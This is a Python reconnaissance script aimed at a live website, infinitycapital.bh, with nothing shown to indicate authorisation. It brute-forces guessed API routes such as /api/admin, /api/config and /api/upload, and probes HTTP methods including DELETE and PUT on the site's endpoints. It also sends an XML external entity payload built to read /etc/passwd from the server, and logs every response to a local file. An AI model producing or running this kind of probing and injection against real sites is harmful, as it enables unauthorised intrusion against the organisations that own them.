#!/usr/bin/env python3
"""W19f: map the real server-side API surface (site is live, not blocked)."""
import json, time, urllib.request, urllib.error, urllib.parse

UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
BASE = "https://www.infinitycapital.bh"
OUT = open("/tmp/w19f.jsonl", "w")


def req(path, method="GET", data=None, ctype="application/json", hdrs=None, timeout=25):
    url = BASE + path
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else data.encode()
    r = urllib.request.Request(url, data=body, method=method,
                               headers={"User-Agent": UA, "Accept": "*/*"})
    if body is not None:
        r.add_header("Content-Type", ctype)
    for k, v in (hdrs or {}).items():
        r.add_header(k, v)
    t0 = time.time()
    try:
        with urllib.request.urlopen(r, timeout=timeout) as resp:
            b = resp.read()
            return resp.status, dict(resp.headers), b, time.time() - t0
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read(), time.time() - t0
    except Exception as e:
        return 0, {}, str(e).encode(), time.time() - t0


def show(label, res, maxb=300):
    st, h, b, dt = res
    print(f"  {label}: {st} {len(b)}B {dt:.2f}s ct={h.get('content-type','')}")
    print(f"     body={b[:maxb]!r}")
    OUT.write(json.dumps({"label": label, "status": st, "len": len(b),
                          "headers": {k: v for k, v in h.items()},
                          "body": b[:2000].decode("utf-8", "replace")}) + "\n")
    OUT.flush()


print("=== 1) API route discovery (GET) ===")
for p in ["/api", "/api/", "/api/send", "/api/contact", "/api/newsletter",
          "/api/subscribe", "/api/health", "/api/status", "/api/config",
          "/api/admin", "/api/user", "/api/auth", "/api/login", "/api/register",
          "/api/webhook", "/api/upload", "/api/graphql", "/graphql",
          "/api/news", "/api/blog", "/api/search", "/api/proxy", "/api/fetch",
          "/api/preview", "/api/render", "/api/pdf", "/api/export", "/api/og"]:
    show(f"GET {p}", req(p))
    time.sleep(1.2)

print("\n=== 2) method probes on known endpoints ===")
for p in ["/api/send", "/api/contact"]:
    for m in ["OPTIONS", "HEAD", "POST", "PUT", "DELETE", "PATCH"]:
        show(f"{m} {p} (empty)", req(p, method=m))
        time.sleep(1.2)

print("\n=== 3) /api/send error behaviour (shape discovery) ===")
cases = [
    ("json empty", "{}", "application/json"),
    ("json null", "null", "application/json"),
    ("json array", "[]", "application/json"),
    ("json bad type", json.dumps({"targets": 12345}), "application/json"),
    ("json str target", json.dumps({"targets": "notanemail"}), "application/json"),
    ("form empty", "", "application/x-www-form-urlencoded"),
    ("xml body", '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>', "application/xml"),
    ("text body", "hello", "text/plain"),
]
for lbl, d, ct in cases:
    show(f"POST /api/send [{lbl}]", req("/api/send", method="POST", data=d, ctype=ct))
    time.sleep(1.5)
